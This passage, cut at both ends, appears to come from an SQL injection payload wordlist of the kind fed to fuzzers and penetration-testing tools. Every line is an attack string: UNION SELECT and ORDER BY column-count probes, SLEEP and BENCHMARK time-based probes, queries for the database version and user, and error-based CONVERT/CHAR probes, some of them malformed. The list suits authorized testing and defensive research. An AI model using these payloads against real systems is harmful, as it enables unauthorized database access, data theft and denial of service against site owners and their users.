1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \\r\\n UNION ALL SELECT 1\\r\\n UNION ALL SELECT 1,2\\r\\n UNION ALL SELECT 1,2,3\\r\\n UNION ALL SELECT 1,2,3,4\\r\\n UNION ALL SELECT 1,2,3,4,5\\r\\n UNION ALL SELECT 1,2,3,4,5,6\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\\r\\n UNION ALL SELECT 1#\\r\\n UNION ALL SELECT 1,2#\\r\\n UNION ALL SELECT 1,2,3#\\r\\n UNION ALL SELECT 1,2,3,4#\\r\\n UNION ALL SELECT 1,2,3,4,5#\\r\\n UNION ALL SELECT 1,2,3,4,5,6#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\\r\\n UNION ALL SELECT 1-- \\r\\n UNION ALL SELECT 1,2-- \\r\\n UNION ALL SELECT 1,2,3-- \\r\\n UNION ALL SELECT 1,2,3,4-- \\r\\n UNION ALL SELECT 1,2,3,4,5-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \\r\\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \\r\\n UNION SELECT @@VERSION,SLEEP(5),3\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),4\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\\r\\n UNION SELECT @@VERSION,SLEEP(5),\"\\'3\\r\\n UNION SELECT @@VERSION,SLEEP(5),\"\\'3\\'\"#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),4#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\\r\\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\\'A\\')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\\r\\n UNION ALL SELECT USER()-- \\r\\n UNION ALL SELECT SLEEP(5)-- \\r\\n UNION ALL SELECT USER(),SLEEP(5)-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\'))-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \\r\\n UNION ALL SELECT NULL-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL 